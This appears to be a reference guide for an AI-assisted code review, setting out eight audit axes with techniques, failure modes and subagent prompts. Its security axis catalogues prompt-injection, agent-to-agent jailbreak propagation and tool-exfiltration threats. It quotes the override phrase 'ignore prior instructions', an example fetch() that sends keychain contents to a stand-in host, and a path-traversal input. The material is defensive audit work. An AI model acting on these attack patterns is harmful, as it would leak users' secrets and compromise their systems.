# Axis Details

Search patterns, techniques, and known failure modes for each of the eight axes. Use with the language-specific patterns in `languages.md`.

Each axis has three subsections:
- **Techniques** — how to look
- **Known failure modes** — what you are looking for
- **Prompt for the axis explorer** — what to send the subagent

---

## Axis A — Feature integrity

**Core question:** Does every advertised capability actually work end-to-end?

This axis is done by the reviewer, not a subagent. It requires holding the advertised-capability list in your head and tracing each entry through the code. A subagent will rubber-stamp; you need synthesis.

### Techniques

- Build a capability list from README, `--help` output, UI labels, docs/, marketing pages. Every bullet in the "features" section of the README is a capability.
- For each capability, find the user-visible entry point: a CLI subcommand, a UI button, a config key, an API endpoint, an IPC command.
- Walk from entry to execution: parse → dispatch → handler → backend. Note every hop where the code branches.
- At each branching hop, test whether the branch for this capability *differs* from the generic path. If `ProviderType::Gemini` and `ProviderType::Pty` both end up calling `spawn_pty_agent`, the Gemini capability is fake.
- Look for `if cfg!(test)` or `#[cfg(not(feature = "..."))]` guards that make the production path diverge from what tests cover.

### Known failure modes

- **Collapsed match.** `A | B | C => f()`. The enum variants are advertised as distinct capabilities but share an implementation.
- **Factory rejects variant.** `Err("not yet implemented")` when the user has selected a feature the README claimed.
- **No-op trait impl.** `fn send_task(...) -> Response { Response { success: false, error: "Not implemented" } }`. The function exists to satisfy the trait; it does not actually do the work.
- **Config-only feature.** A `config.toml` option exists and documentation describes behavior, but no code reads the option.
- **Protocol without parser.** Writer emits structured strings to a stream; no reader parses them. The feature "sends messages" but nothing receives them.
- **UI picker without backend.** Tauri/React UI offers a dropdown for a feature; the backend command handler rejects it.

### Prompt for axis explorer

*(This axis is handled by the reviewer, but if delegated:)*

> For each capability in this list, trace from the user-visible entry point through to where it executes. List every hop. At the final hop, report whether the code is genuinely specific to this capability or whether it collapses into a generic path. Cite file:line at each hop and quote the relevant match arm or dispatch.

---

## Axis B — Stubs and dead code

**Core question:** What is defined but not implemented, or implemented but never called from production?

### Techniques

- Run the full-language stub grep (see `languages.md`) and report raw counts per file.
- Dataflow: pick every function in production crates whose name matches a feature capability; grep for callers; flag any whose callers are test-only.
- Look at match arms that are syntactically valid but logically empty: `Variant => {},` or `Variant => Ok(())` with no side-effect.
- Check every `TODO:` / `FIXME:` / `XXX:` / `HACK:` comment against the nearest enclosing function: is the function still shipped? Is it on a live code path?

### Known failure modes

- **Macro-stubbed.** `todo!()`, `unimplemented!()`, `panic!("TODO")`, `NotImplementedError`, `throw new Error("not implemented")`, `TODO("...")`, `return godog.ErrPending`.
- **Comment-stubbed.** Function body is a single `// TODO:` comment followed by `Ok(())` or `return None`.
- **Hollow match arm.** `Variant => { /* handled elsewhere */ }` — but nothing handles it elsewhere.
- **Defined but uncalled.** A function exists with a plausible production name, but `git grep -w <name>` shows only the definition and test callers.
- **Placeholder parser.** Function accepts input and always returns `ParsedOutput::Raw(input)` with a TODO to do real parsing.
- **Dev-mode-only path.** A feature is gated behind `if env::var("DEV_MODE").is_ok()` with no production implementation.
- **Disabled workflow file.** `.yml.disabled` in `.github/workflows/` or similar. Sentinel that a real capability was once written and is not currently active.

### Prompt for axis explorer

> Search the project under <repo-root> for all of the following patterns in production crates (exclude test crates and example dirs):
>
> - `todo!()`, `unimplemented!()`, `panic!("TODO")`, `panic!("not yet")`
> - String literals "not yet implemented", "Not implemented", "Not Implemented", "TODO:", "FIXME:", "XXX:", "HACK:"
> - `raise NotImplementedError`, `throw new Error('not implemented')`, `TODO(\"...\")`
>
> For each hit, quote the function or block it lives in (file:line) and report whether it is reachable from a production entry point. If you believe the function is unreachable, prove it by showing the callsite search.
>
> Separately: produce a list of functions in `src/` or `crates/*/src/` whose only callers are in test files — pick ten candidates by heuristic (plausible production names) and grep.
>
> If you find zero issues, prove it by listing the five files you considered most suspicious and the exact reason each one was clean.

---

## Axis C — User-journey walk

**Core question:** Can a fresh user clone the repo and use the product per the documented setup?

**This axis is done by the reviewer, not a subagent.** Reading about the setup is not the same as attempting it. The failure modes here only surface when you actually run the commands.

### Techniques

- Clone into a fresh temp directory outside the main worktree.
- Follow README setup verbatim — every step, in order, with no shortcuts.
- Run the advertised build command. Capture output.
- Run the advertised test command. Capture output.
- Run the product's quickstart. Capture output.
- Note anything the README does not explain but the shell required (an env var, a Docker daemon, a specific toolchain version).

### Known failure modes

- **Fresh-worktree build fails** because of a relative path in a build config (`frontendDist: "../../..."`) that only works from one directory.
- **Missing bootstrap step** — README says `cargo build`, but a sidecar binary must be built first.
- **Intermittent test failure** — a test pollutes environment variables and breaks later tests non-deterministically.
- **Undocumented prereq** — `protoc` / `pkg-config` / `libssl-dev` / a Rust-toolchain-file-level override that the README does not mention.
- **Platform assumption** — commands work only on macOS / only on Linux / only when run from a login shell.
- **Quickstart that can't run** — quickstart references `config.example.toml` that doesn't exist, or expects a running daemon with no instructions to start one.

### Reporting the walk

Even if the walk succeeds, report it explicitly. "User journey: clean build in 3m42s on Darwin 24.0.0; tests pass; quickstart completes" is a positive finding that the axis was actually covered.

If any step fails, the failure itself is a finding. Severity depends on how early it fails and how hard it is to recover.

If credentials or a proprietary SDK are genuinely unobtainable, report the walk as a coverage gap with the specific missing prereq.

---

## Axis D — Test quality and honesty

**Core question:** Do tests verify real behavior, or just log and return green?

### Techniques

- Enumerate test-framework attributes: `#[test]`, `#[tokio::test]`, `#[then]`, `#[when]`, `#[given]`, `@pytest.fixture`, `test()` blocks, `describe()/it()`, JUnit `@Test`, etc.
- For each attribute kind, count the total, and count how many bodies contain at least one real assertion (`assert!`, `assert_eq!`, `.expect()` chain-end, `should.equal`, `pytest.raises`, `@ParameterizedTest`, `@Nested`).
- Sample 10 steps per attribute kind. Read the bodies. How many are only `tracing::info!`, `console.log`, `print`, `eprintln!`? How many are empty? How many are `pass` or `return`?
- Find the CI quality gate that is supposed to prevent low-quality tests: a script in `scripts/` or `ci/`, a workflow step in `.github/workflows/*.yml`, a build.rs. Read it. What patterns does it match? What does it miss?

### Known failure modes

- **Log-as-assertion.** `#[then("the X should be Y")] async fn the_x_should_be_y(world: &mut TestWorld) { tracing::info!("TODO: verify X is Y"); }`.
- **CI gate with blind spot.** Gate scans `#[test]` functions, ignores `#[then]` step definitions entirely. Or gate counts `assert!` as the only signal and accepts `log()` as equivalent.
- **Test that always passes.** `assert_eq!(actual, actual)` — a regression from a refactor that was never reverted.
- **`@skip` / `@ignore` masquerading as coverage.** Feature file has 30 scenarios; 28 are `@skip`; dashboard reports "30 scenarios defined, all passing."
- **Commented-out assertions.** Real assertion exists but is commented out with a TODO.
- **Mock that accepts anything.** `mock.expect(..).returning(|_| Ok(()))` — verifies the function was called but not that the arguments made sense.
- **Unit test that never reaches the unit.** Test setup fails silently; the unit-under-test is never invoked.

### Prompt for axis explorer

> Under `<test-path>`, for each BDD step definition (`#[then]`, `#[when]`, `#[given]`), report:
>
> - Total count of step definitions
> - Count of step bodies whose only non-binding statements are log calls (`tracing::info!`, `println!`, `eprintln!`, `log::info!`, `console.log`, `print`) and no assertions
> - A representative sample of 5 step bodies from the above count, with file:line and full body quoted
>
> Separately: find any CI script that claims to enforce test quality (`.github/workflows/*.yml`, `scripts/**/check*.{sh,py}`, build.rs). For each, quote what it actually matches and identify what it misses.
>
> If you find zero hollow steps, prove it: list 5 step files you thought most likely to contain stubs and quote the first 3 lines of 3 randomly-chosen step bodies from each.

---

## Axis E — Security & threat model

**Core question:** Is there a complete threat model, and does the code defend against all of it — external surfaces, APIs, LLM prompt-injection (including agent-to-agent inside the trust boundary), tool-use exploitation, context poisoning, and supply-chain compromise?

This axis is structured in four phases. Reviewer-authored, not delegable in whole to a subagent. Phase 2 (vulnerability sweep) may be parallelized across subagents, each covering a sub-scope; the others require architectural synthesis.

A boundary-only review reliably misses the hardest class of attack in LLM multi-agent systems: **the attacker is already inside the trust boundary** — a compromised peer agent, a jailbroken agent acting on malicious tool output, a poisoned memory/inbox entry, a malicious MCP server returning adversarial context. None of these are caught by "is the token checked on the listener?" style questions.

### Phase 1 — Threat model

Before you write any finding, produce the threat model. Template in `references/threat-model-template.md`. Fill in for the project under review:

**Actors** — who might want to cause harm or be involved:
- End user (legitimate; may also be an attacker on multi-user or public deployments)
- Developer / contributor (may introduce vulnerability inadvertently or maliciously)
- CI/build system (may be compromised; may run untrusted code)
- Agent inside the boundary (one agent becomes adversarial — jailbroken, compromised model, attacker-crafted task)
- Peer agent in the same system (for multi-agent products — assume not trusted)
- External network attacker (against HTTP/WebSocket/gRPC/Unix-socket listeners)
- Upstream supply chain (MCP servers, plugins, crate/npm deps, Docker base images, LLM provider responses)
- Lateral process on the same host (same UID; VS Code extension; npm postinstall; any background process)
- Other tenant (if the product is ever multi-tenant)

**Assets** — what must be protected:
- Secrets (API keys, refresh tokens, signing keys, session tokens, Keychain contents)
- Session state (authenticated sessions, conversation context, memory store)
- Source code and repo writes (the user's project; another agent's worktree)
- Prompts (user-provided, system-provided, memory-derived, tool-output-derived)
- Agent outputs (tool-call arguments, completions, file writes, git commits, network requests)
- Host machine (file system, running processes, keychain, ssh keys, browser cookies)
- Other agents' context (prompts, memory, inbox, task files)
- LLM provider billing (an attacker driving token spend is a cost-based DoS)

**Trust boundaries** — each pair has a separate trust relationship:
- User ↔ UI
- UI ↔ daemon (IPC; authn/authz required)
- Daemon ↔ agent (PTY or gRPC; sidecar authn required)
- Agent ↔ plugin
- Agent ↔ MCP server
- Agent ↔ filesystem (agent can write files — which files?)
- Agent ↔ network (agent may make outbound requests via tools or MCP)
- Agent ↔ LLM provider API
- Agent A ↔ Agent B (via inbox, memory, shared git branches, shared config)

**Attack surfaces** — concrete entry points:
- Every IPC command (enumerate the enum)
- Every HTTP/WebSocket/gRPC endpoint (enumerate handlers)
- Every config file read path (`.swarm/*.toml`, `~/.swarm/*.toml`, `mcp.toml`, `plugin.toml`, `personas/*.md`, `guidance/*.md`)
- Every MCP server invocation (subprocess spawn from config)
- Every plugin load path
- Every inbox/mailbox ingest point
- Every memory write-back / retrospective / proposal write point
- Every place a tool output reaches an agent's prompt
- Every subprocess spawned with inherited environment
- Every file the agent is authorized to write
- Every git operation the agent is authorized to execute

Produce the actor × surface × threat matrix. A representative cell: {Actor = compromised peer agent, Surface = shared memory store, Threat = prompt injection of jailbreak into future agent sessions}. Every non-trivial cell becomes a finding-candidate.

### Phase 2 — Vulnerability sweep

For each category below, produce either a finding (with file:line and short quote) or an explicit "not present, evidence is …". No silent omissions.

**Injection:**
- Command injection in any subprocess spawn (`Command::new` + user-derived args)
- Path injection / path traversal (`path.join(user_input)` without canonicalize+containment check)
- Header injection (HTTP response headers built from user input)
- SQL / TOML / JSON / YAML / format-string injection
- Prompt injection (covered separately in Phase 3)

**Authentication:**
- Every listener / RPC / endpoint requires authn (enumerate; any that don't is a finding)
- Token format strict (`Authorization: Bearer …` only; no query-param fallback; no lowercase-bearer variants)
- Dev-mode/bypass paths documented and segregated; not accidentally reachable in production builds
- Token lifetime, refresh, revocation all addressed

**Authorization:**
- Per-command capability gating (not "authenticated = permitted")
- Client-identity → capability-set mapping made explicit at handshake (UI vs CLI vs sidecar vs agent — each different)
- Destructive commands (terminate, delete, push, merge) separately gated or rate-limited
- Per-resource permission (Agent A cannot read Agent B's inbox, memory, or worktree)

**Cryptographic handling:**
- Secrets at rest (Keychain/KMS vs file vs plaintext; mode bits; process-accessibility)
- Secrets in transit (TLS everywhere or justified exception; cipher suite discipline)
- Key management (generation ceremony, rotation, revocation, storage)
- RNG source (cryptographic PRNG for tokens, not `rand::random`)
- Hash choice for sensitive data (`argon2` / `bcrypt` / `scrypt` for passwords, not `sha256`)
- HMAC/signature verification (constant-time comparison; no string compare on auth material)

**Deserialization:**
- Every untrusted input decoded safely (bounded length, schema validation, no polymorphic unsafe types)
- `serde_yaml` on untrusted input — known to support unsafe tags in some configs
- Pickle / marshal / Java-serialization on untrusted input (don't)
- Bincode/CBOR with max-size checks

**Network and SSRF:**
- Any outbound HTTP/URL from user input — is the scheme, host, port allowlisted? Metadata services (169.254.169.254) blocked?
- Redirect-following bounded? Internal addresses rejected?
- DNS rebinding mitigations present?

**Security misconfiguration:**
- Default passwords / secrets in docs or defaults
- Debug endpoints reachable in release builds
- Verbose error messages leaking internals
- CORS policy permissive where it shouldn't be
- Filesystem permissions on sensitive files (0600 for token files, 0700 for dirs)

**Vulnerable dependencies:**
- `cargo audit` / `npm audit` / `pip-audit` wired into CI?
- SBOM generated and published with releases?
- Pin-strategy for transitive deps (lockfile committed? minimum-versions enforced?)
- Vendored copies of libraries audited (`target/` ignored, but `vendor/` directories?)

**Logging, redaction, audit:**
- Secrets never reach logs (redaction layer; test coverage for the layer)
- Audit log exists for destructive / cross-trust-boundary actions
- Audit log is tamper-resistant (append-only; writer is not the auditor)
- PII handling / GDPR obligations (if applicable)

**Rate limiting and DoS:**
- Per-connection rate limits (axis F also checks this; here we check that the limits are tight enough against malice, not just accident)
- Per-command / per-destination limits
- Memory bombs (deserialization bombs; zip bombs; regex catastrophic backtracking)
- Token-cost DoS (an attacker driving LLM spend via crafted prompts)

**TOCTOU / race conditions:**
- Any `fs::exists` + `fs::read` pattern (use `fs::read` and handle error)
- Any `fs::symlink_metadata` + follow-through
- Lock acquisition that doesn't cover the critical state read-then-write

**Path / symlink:**
- Every path derived from user input canonicalized and contained within a known root
- Symlinks followed during writes? (Usually bad — symlink-to-sensitive-target attack)
- Temp file creation with secure mode and atomic rename

### Phase 3 — LLM-specific threat coverage

This is the class of threat boundary-style reviews miss. LLM systems have a richer attack surface than traditional apps. Walk each:

**T1. Direct prompt injection.** User directly says "ignore prior instructions…". Mitigation: not a thing you can fully mitigate in general LLM apps, but the user is the legitimate authority so this is less pressing than indirect vectors. Note system-prompt construction robustness.

**T2. Indirect prompt injection (from external content).** The agent reads content that was authored by an attacker: a webpage fetched by a tool, a doc in the user's repo authored by a third party, a file written by another agent. Mitigation: *every* externally-derived content stream that reaches the prompt must be wrapped in a sanitizer + XML-fence. Cite every surface and confirm the wrapper is applied.

**T3. Agent-to-agent injection via shared state.** Critical for multi-agent products. Compromised agent A writes to a surface that agent B reads: inbox, memory, task files, retrospectives, proposals, shared git branches, shared personas/guidance, shared config. Walk every surface; confirm:
- Sanitize-and-wrap applied at read time (not at write time — writes happen too many places)
- Authorship tagged (agent B knows "this came from agent A, not the user")
- Cross-agent write is capability-gated (agent A shouldn't be able to write to agent B's private inbox or memory)

**T4. Tool-use exploitation.** The agent has tools. A jailbroken / injected agent uses tools to harm. Walk every tool:
- File write tool — which paths allowed? Agent's worktree only? Can it write outside via symlink? Can it overwrite `.git/hooks`?
- Shell tool — allowlist? Blocked commands? Approval gate? Logged?
- Network tool — outbound allowlist? Exfiltration via DNS / ICMP / slow HTTP?
- Git tool — push/force-push/delete-branch allowed? Approval for destructive ops?
- MCP tool calls — arguments validated before forwarding?

**T5. Output exfiltration via crafted tool arguments.** Attacker tricks agent into encoding a secret in a "legitimate" API call. Example: `fetch("https://analytics.example/log?event=page&user=" + CONTENTS_OF_KEYCHAIN)`. Mitigation: egress allowlist + redact known secret patterns from outbound args.

**T6. Context poisoning.** Attacker seeds shared state (memory, guidance docs, personas) with content that steers future agent behavior. Low-and-slow — no single injection is blatant; cumulative effect is the attack. Mitigation: provenance tagging on memory; human-approval gate on guidance edits; integrity check on personas.

**T7. Jailbreak propagation.** Compromised agent produces output that, when ingested by the next agent, propagates the jailbreak. Mitigation: same as T2/T3 — sanitize-and-wrap everywhere, authorship tagging.

**T8. Supply-chain prompt injection.** A third-party MCP server or plugin returns adversarial content. Mitigation: treat every MCP / plugin response as untrusted input (T2). Additionally: allowlist MCP servers, verify server identity, audit log all MCP calls.

**T9. Tool-call side-channel exfiltration.** Covered by T5 but also timing, request-count, and DNS-query patterns. More specialized; note if the product has high-value secrets.

For each threat, produce a row:

| Threat | Relevant surface(s) | Mitigation site | Status |
|---|---|---|---|
| T3 — agent-to-agent injection via inbox | `inbox.rs`, agent-render path | `memory/render.rs` wrapper | ❌ MISSING — wrapper exists for memory only |
| … | … | … | … |

### Phase 4 — Adversary scenarios

For each scenario, walk the attack chain end-to-end. Even if the individual steps are already covered elsewhere, the scenario walk tests whether the mitigations *compose* — half the time they don't. Each scenario produces a narrative paragraph plus file:line citations.

Minimum scenario set:

**S1. Compromised peer agent → harm to another agent.**
Start: Agent A has been jailbroken by a crafted task / content from the user / poisoned memory.
Goal: exfiltrate Agent B's conversation, steal Agent B's secrets, or cause Agent B to produce malicious output.
Walk: every surface A can write to that B reads. Every shared secret. Every tool call A can make that affects B's environment. Every git branch A can push to that B will rebase onto.

**S2. Compromised plugin.**
Start: User installs a plugin that claims a low trust tier in its manifest.
Goal: execute arbitrary code on the host; steal secrets; persist malicious behavior.
Walk: manifest-trust check → sandbox backend → host access; what does the plugin reach in each phase? Is the sandbox a real `NoOpBackend`? Is the manifest-trust validated cryptographically or self-declared?

**S3. Malicious MCP server.**
Start: User's `.swarm/mcp.toml` has an entry added by a compromised repo they cloned.
Goal: RCE via subprocess; credential theft via environment; prompt injection via returned content.
Walk: subprocess-spawn arg validation; environment-variable interpolation; MCP response ingestion; audit log existence.

**S4. Malicious `.swarm/*.toml` / persona / guidance in a cloned repo.**
Start: User clones a repo; repo contains attacker-authored config files.
Goal: change agent behavior silently; inject prompt steering the agent toward goals the user didn't intend.
Walk: config-file read path; signature/approval gate; prompt-construction path; provenance tagging.

**S5. Network attacker on a daemon listener.**
Start: An attacker reaches the daemon's listener (UDS, named pipe, gRPC, WebSocket).
Goal: command execution via IPC; session takeover.
Walk: authn; authz; rate-limit; per-command audit; query-string credential acceptance.

**S6. Lateral same-UID process.**
Start: A process under the same UID (legitimate: editor, browser, MCP client; malicious: npm postinstall, compromised dev tool) reaches the IPC token file.
Goal: act as the UI and execute arbitrary commands.
Walk: token file permissions; IPC identity / handshake; what a CLI-class client can do vs a UI-class client; destructive-command separation.

**S7. Upstream supply-chain compromise.**
Start: A published crate / npm package / Docker base image used by the project is compromised.
Goal: execute attacker code at build time or runtime.
Walk: SBOM; pin policy; audit tooling in CI; signing of published artifacts; reproducibility.

### Known failure modes (concrete signals)

- **Authentication without authorization.** "Can read the token" = "can do anything". Per-command capability check absent.
- **Declarative sandbox.** `NoOpBackend` is the only backend; module header says it out loud; trust decisions happen elsewhere.
- **Unvalidated newtype.** `AisbAgentId::new(s: impl Into<String>)` accepts `../../../etc/passwd`; downstream `base_dir.join(id)`.
- **Subprocess arg without metachar reject.** `Command::new(config.command).args(&config.args)` from user-controlled TOML.
- **Documented interpolation not implemented.** Docstring says `${VAR}` expands from Keychain; code passes the literal string.
- **Release workflow disabled.** No reproducible signed build; no SBOM.
- **Prompt-injection surface with no wrapper.** One surface sanitized (memory); others not (inbox, tasks, proposals, retrospectives).
- **Query-string bearer token.** `?token=...` accepted by a WebSocket handler.
- **Cross-agent write without capability check.** Agent A can write to `.swarm/inbox/<agent-b-id>/` because `AisbAgentId` is untyped.
- **Secrets interpolated into env without redaction.** `child.env("TOKEN", secret)` then logs `{:?}` of the Command.
- **Plaintext in logs.** `info!("request = {:?}", req)` where `req` contains bearer tokens.
- **Config-file signer absent.** Any `.swarm/*.toml` trusted if it exists, with no integrity check.
- **Manifest-declared trust tier.** `plugin.toml` declares `trust = "Official"` and the code believes it.
- **Missing egress controls on agent tools.** Agent can `fetch` any URL; no allowlist.

### Prompt for subagent delegation (Phase 2 sub-parts only)

The threat model (Phase 1), LLM coverage (Phase 3), and adversary scenarios (Phase 4) are reviewer-authored. For Phase 2 vulnerability sweep, you may split by sub-scope. Example subagent prompt per sub-scope:

> In `<repo-root>`, under `<sub-scope-path>`, audit the following categories and return findings with file:line + quoted evidence for each, or an explicit "not present" with the evidence that led you to that conclusion:
>
> - {injection type(s) relevant to this sub-scope}
> - {authn/authz relevant here}
> - {crypto relevant here}
> - {deserialization relevant here}
>
> If you report "clean" for any category, list the five most suspicious files/callsites you ruled out, and quote the line that made you rule each one clean.
>
> Do not synthesize across sub-scopes — I'll do that. Do not produce a threat model — I'll do that. Do not comment on the adversary scenarios — those are not your scope.

---

## Axis F — Reliability and logic

**Core question:** Will this survive concurrency, partial failures, restarts, realistic production load?

### Techniques

- Find every lock acquisition site. Note order. Are there paths that acquire A-then-B while others acquire B-then-A?
- Find every `let _ = fn_with_side_effects()` and `.ok()` chain in state-owning modules. Are errors genuinely ignorable, or does silencing them cause drift (session count, cost tracker, config merge)?
- Find every spawn that lacks a join handle. Who cleans up on failure?
- Find lifecycle paths (spawn agent, start session, open connection). What is the cleanup contract on failure mid-flow?
- Find all `tokio::time::sleep` loops — are they busy-waits where async event-driven would be correct?

### Known failure modes

- **Lock-order inversion, latent.** `A.write()` taken while holding `B.read()` in one path; `B.write()` taken independently in another. Deadlock manifests only under contention.
- **Check-then-act race.** Cost tracker checks `tracker.read()`, then releases, then writes. A parallel caller can sneak a spend in between.
- **Silent cleanup skip.** Spawn allocates PTY, creates inbox directory, starts output task — then registration fails. No RAII guard; artifacts orphan until daemon restart.
- **Discarded lifecycle error.** `let _ = session_manager.update_agent_count(...)`. Metadata drifts from reality.
- **Busy-wait disguised as async.** `loop { tokio::time::sleep(Duration::from_millis(10)).await; try_read(); }` — waste and latency.
- **Thread-per-read.** `spawn_blocking` on every PTY read. Thread exhaustion under concurrent agents.
- **Config merge that drops errors.** `let _ = std::fs::create_dir_all(...); let _ = std::fs::write(...);`. Disk-full / permission-denied silently drops output.

### Prompt for axis explorer

> In `<repo-root>`, audit:
>
> 1. All `RwLock` / `Mutex` acquisition sites. Note the order of nested acquisition. Flag any pair A/B acquired in opposite orders by different callsites.
> 2. All `let _ = ...` and `.ok()` at statement level in state-owning modules (session, lifecycle, config merge, persistence, billing, metering). For each, state whether silencing is justified.
> 3. All `tokio::spawn` / `std::thread::spawn` without a retained join handle in production (non-test) code.
> 4. All busy-wait loops (`sleep(small); try`) that could be event-driven.
>
> Cite file:line with one line of quoted context. Clean verdicts require the five-suspicious-files proof.

---

## Axis G — Ship hygiene

**Core question:** Can this build be signed, distributed, and reproduced?

### Techniques

- Perform the clean-worktree build (this overlaps with axis C but the emphasis here is on the *ship* path, not the *user* path).
- Enumerate every path in build configs (`Cargo.toml`, `tauri.conf.json`, `package.json`, `build.gradle`, `Info.plist`) — look for relative paths or `../../` navigation that assumes a specific invocation directory.
- Check `.github/workflows/` for every `*.yml.disabled` file. Each is a sentinel that a capability was once scaffolded.
- Check for SBOM emission: CycloneDX / SPDX generation in CI. `cargo-audit`, `npm audit`, `pip-audit` wired into a gate.
- Check code-signing pipeline: macOS notarization via `notarytool`, Windows signing via signtool, Linux GPG sigs on release artifacts.
- Check reproducibility: are builds deterministic? Do release artifacts include checksums? Does the release note include the CI run URL?

### Known failure modes

- **Build path relativity.** `frontendDist: "../../ui/dist"` that resolves only when invoked from one directory.
- **Release workflow `.disabled`.** No CI-produced signed build. Developer machine is the root of trust.
- **Signing keys in developer Keychain.** Reproducibility destroyed; key rotation impossible.
- **No SBOM.** Cannot answer "what OSS is in this bundle" for downstream consumers.
- **Updater bundled optionally.** `cargo tauri build -- --features updater` used locally; CI builds without updater; shipped bundle cannot self-update.
- **Missing submodule init.** `git clone` succeeds, `cargo build` fails because a bootstrap script was needed but is not in CI path.

### Prompt for axis explorer

> Evaluate ship hygiene in `<repo-root>`:
>
> 1. Run the documented build from a fresh temp clone. Capture pass/fail with full output.
> 2. List every `*.yml.disabled` in `.github/workflows/` and quote the first 10 lines of each.
> 3. Check for SBOM / signing / notarization steps in any active workflow. Quote them.
> 4. List every relative path in `tauri.conf.json`, `Cargo.toml`, `package.json`, `build.gradle`. Flag any that assumes a specific invocation directory.
> 5. Determine whether the updater key management is documented and whether keys are in CI secrets vs. developer machines.
>
> Cite file:line. Clean verdicts require the five-suspicious-files proof.

---

## Axis H — Doc ↔ code cross-check

**Core question:** Does every claim in README, CLI help, UI labels, and top-level docs map to real code?

**This axis is done by the reviewer.** The whole point is that you take every claim seriously and chase it.

### Techniques

- Build the capability list from README, `--help` output, and top-level `docs/**`. One row per claim.
- For each claim, grep for the exact capability name in code. Read the delivering function. Does it actually deliver?
- For every CLI subcommand with a help string, run `<cmd> --help` (or read the clap derives) and verify the listed options do what they claim.
- For every Tauri/Electron command surfaced in the UI, trace from the React callsite through the IPC command enum to the handler. Is the handler a real implementation or a stub?

### Known failure modes

- **Advertised-but-fake provider.** README: "Supports Claude, Gemini, Codex as distinct providers." Code: `Pty | Sdk | Gemini => spawn_pty_agent`.
- **Advertised-but-rejected runtime.** README: "Deploy agents in Docker, Kubernetes, or cloud." Code: `ProviderType::Kubernetes => Err("not implemented")`.
- **Advertised-but-dead endpoint.** README: "HTTP API for remote control." Code: handler drops the socket.
- **Advertised-but-unparsed protocol.** README: "Agents can approve risky actions." Code: sends `APPROVAL:ID:APPROVED\n` to a CLI that has no parser for it.
- **Docstring fiction.** Module header: "Env-var interpolation via `${VAR}` supported." Code: passes the literal string to the subprocess.
- **Config documented, not read.** `config.toml` key appears in docs. No code path actually reads it.
- **UI picker without backend.** Tauri dropdown offers a provider; handler rejects the enum variant.

### Reporting the cross-check

For each capability, produce a row:

```
| Capability | Advertised at | Delivered at | Status |
|---|---|---|---|
| Multi-agent Kubernetes deploy | README.md:91-106 | factory.rs:207-211 | ❌ ADVERTISED-BUT-FAKE |
| MCP env-var interpolation | mcp/mod.rs:31 docstring | mcp/server.rs:149 | ❌ DOCSTRING FICTION |
| Claude CLI provider | README.md:32 | agent_lifecycle.rs:... | ✅ WORKS |
```

Every ❌ row is a finding. The severity is usually CRITICAL or HIGH because these are truth-in-advertising failures.
